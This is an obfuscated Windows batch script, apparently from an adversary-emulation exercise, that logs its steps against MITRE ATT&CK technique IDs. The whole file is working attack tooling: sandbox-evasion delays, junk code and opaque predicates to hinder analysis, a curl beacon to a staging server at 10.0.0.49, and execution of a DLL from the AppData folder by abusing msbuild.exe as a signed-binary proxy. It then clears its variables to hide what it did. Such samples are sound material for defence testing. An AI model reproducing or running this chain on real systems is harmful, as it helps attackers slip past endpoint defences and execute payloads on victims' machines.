@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants assigned to random variable names
SET txisnba=%APPDATA%\7961\d0300bba
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7961-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=goog1edrive.txt
SET dvhhyc=7961

REM Random variables for internal use
SET zxmqp=mdvfmsbx
SET lkjsdf=txisnba
SET pqwie=xzanpex
SET mnbvvc=jwcnifl
SET qwert=rrocubc
SET asdfg=dvhhyc
SET logvar=%APPDATA%\!qwert!\macula-simulations.log
SET agentvar=mnbvvc

REM Initial delay to evade sandbox analysis
echo [!DATE! !TIME!][DEBUG][!agentvar!]: initial_delay_start>>> "!logvar!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: initial_delay_complete>>> "!logvar!" 2>nul

REM State machine dispatcher
SET state=0
GOTO dispatch_akjdf

:deadcode_mnxcvv
REM Never executed - junk code
SET fakevar=useless_data
GOTO deadcode_kljhgf

:dispatch_akjdf
IF !state!==0 GOTO init_qwzmx
IF !state!==17 GOTO heartbeat_plkji
IF !state!==25 GOTO prepare_exec_qazws
IF !state!==33 GOTO execute_dll_mnbvc
IF !state!==99 GOTO cleanup_okmju
GOTO deadcode_xyzabc

:junk_block_1
REM More dead code
SET garbage=12345
EXIT /B

:init_qwzmx
echo [!DATE! !TIME!][DEBUG][!agentvar!]: initialization_start>>> "!logvar!" 2>nul
SET logdir=%APPDATA%\!qwert!
IF NOT EXIST "!logdir!" mkdir "!logdir!"
echo [!DATE! !TIME!][DEBUG][!agentvar!]: directory_created=!logdir!>>> "!logvar!" 2>nul

REM Random delay between operations
SET /A delay=!RANDOM! %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!agentvar!]: random_delay_start=!delay!s>>> "!logvar!" 2>nul
ping -n !delay! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: random_delay_complete>>> "!logvar!" 2>nul

SET state=17
GOTO dispatch_akjdf

:deadcode_xyzabc
REM Unreachable label
SET junk=more_fake_data
GOTO END

:heartbeat_plkji
echo [!DATE! !TIME!][DEBUG][!agentvar!]: heartbeat_check_start>>> "!logvar!" 2>nul

REM Always true condition with fake branch
IF 1==1 (
    GOTO real_heartbeat_lkjhg
) ELSE (
    GOTO fake_heartbeat_poiuy
)

:fake_heartbeat_poiuy
REM Dead code branch
EXIT /B

:real_heartbeat_lkjhg
curl -k -s -o nul "!keghkgto!"
IF !ERRORLEVEL!==0 (
    SET hb_result=1
    SET hb_err=
    echo [!DATE! !TIME!][DEBUG][!agentvar!]: heartbeat_success>>> "!logvar!" 2>nul
) ELSE (
    SET hb_result=0
    SET hb_err=connection_failed
    echo [!DATE! !TIME!][DEBUG][!agentvar!]: heartbeat_failed=!hb_err!>>> "!logvar!" 2>nul
)

REM Log TTP for heartbeat (T1105 if used, but not primary TTP)
SET timestamp=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2! !TIME!
(
    echo [!timestamp!][!agentvar!]: !qwert!-!asdfg!-T1105|Ingress Tool Transfer=!hb_result!:!hb_err!
) >> "!logvar!" 2>nul || echo >nul

CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_complete>>> "!logvar!" 2>nul

SET state=25
GOTO dispatch_akjdf

:deadcode_kljhgf
REM More unreachable code
SET fake_process=calc.exe
START !fake_process!
GOTO END

:prepare_exec_qazws
echo [!DATE! !TIME!][DEBUG][!agentvar!]: prepare_execution_start>>> "!logvar!" 2>nul

REM Opaque predicate with dead code
SET /A num=5*2+3
IF !num!==13 (
    GOTO real_prep_zxcvb
) ELSE (
    GOTO fake_prep_mnbvc
)

:fake_prep_mnbvc
EXIT /B

:real_prep_zxcvb
SET full_path=!lkjsdf!\!pqwie!
echo [!DATE! !TIME!][DEBUG][!agentvar!]: target_file=!full_path!>>> "!logvar!" 2>nul

REM Check if file exists
IF NOT EXIST "!full_path!" (
    SET file_result=0
    SET file_err=file_not_found
    echo [!DATE! !TIME!][DEBUG][!agentvar!]: file_check_failed=!file_err!>>> "!logvar!" 2>nul
) ELSE (
    SET file_result=1
    SET file_err=
    echo [!DATE! !TIME!][DEBUG][!agentvar!]: file_check_success>>> "!logvar!" 2>nul
)

REM Random delay
SET /A delay2=!RANDOM! %% 10 + 5
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=!delay2!s>>> "!logvar!" 2>nul
timeout /t !delay2! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_complete>>> "!logvar!" 2>nul

SET state=33
GOTO dispatch_akjdf

:junk_block_2
REM Dead code inserted between real operations
SET garbage2=another_fake_var
GOTO END

:execute_dll_mnbvc
echo [!DATE! !TIME!][DEBUG][!agentvar!]: execution_start>>> "!logvar!" 2>nul

REM Find msbuild.exe full path
WHERE msbuild.exe >nul 2>nul
IF !ERRORLEVEL!==0 (
    SET lolbin=msbuild.exe
    echo [!DATE! !TIME!][DEBUG][!agentvar!]: lolbin_found=!lolbin!>>> "!logvar!" 2>nul
) ELSE (
    SET lolbin=C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
    echo [!DATE! !TIME!][DEBUG][!agentvar!]: lolbin_fallback=!lolbin!>>> "!logvar!" 2>nul
)

REM Construct command with obfuscated arguments
SET args=/logger:LoggerEntry,"
SET args=!args!!full_path!
SET args=!args!"^^;MyParameters,Foo

echo [!DATE! !TIME!][DEBUG][!agentvar!]: command=!lolbin! !args!>>> "!logvar!" 2>nul

REM Execute the DLL via msbuild
START "" /WAIT !lolbin! !args!
IF !ERRORLEVEL!==0 (
    SET exec_result=1
    SET exec_err=
    echo [!DATE! !TIME!][DEBUG][!agentvar!]: execution_success>>> "!logvar!" 2>nul
) ELSE (
    SET exec_result=0
    SET exec_err=exit_code_!ERRORLEVEL!
    echo [!DATE! !TIME!][DEBUG][!agentvar!]: execution_failed=!exec_err!>>> "!logvar!" 2>nul
)

REM Log T1218 MITRE TTP
SET timestamp2=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2! !TIME!
(
    echo [!timestamp2!][!agentvar!]: !qwert!-!asdfg!-T1218|Signed Binary Proxy Execution=!exec_result!:!exec_err!
) >> "!logvar!" 2>nul || echo >nul

timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: post_execution_delay_complete>>> "!logvar!" 2>nul

SET state=99
GOTO dispatch_akjdf

:cleanup_okmju
echo [!DATE! !TIME!][DEBUG][!agentvar!]: cleanup_start>>> "!logvar!" 2>nul

REM Cleanup operations with final delay
ping -n 5 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: cleanup_delay_complete>>> "!logvar!" 2>nul

REM Clear variables
SET txisnba=
SET mdvfmsbx=
SET keghkgto=
SET jwcnifl=
SET rrocubc=
SET xzanpex=
SET dvhhyc=
SET state=
SET hb_result=
SET hb_err=
SET exec_result=
SET exec_err=

echo [!DATE! !TIME!][DEBUG][!agentvar!]: cleanup_complete>>> "!logvar!" 2>nul

:END
EXIT /B 0

:deadcode_final
REM Final dead code block at end of file
SET final_junk=end_of_script
GOTO END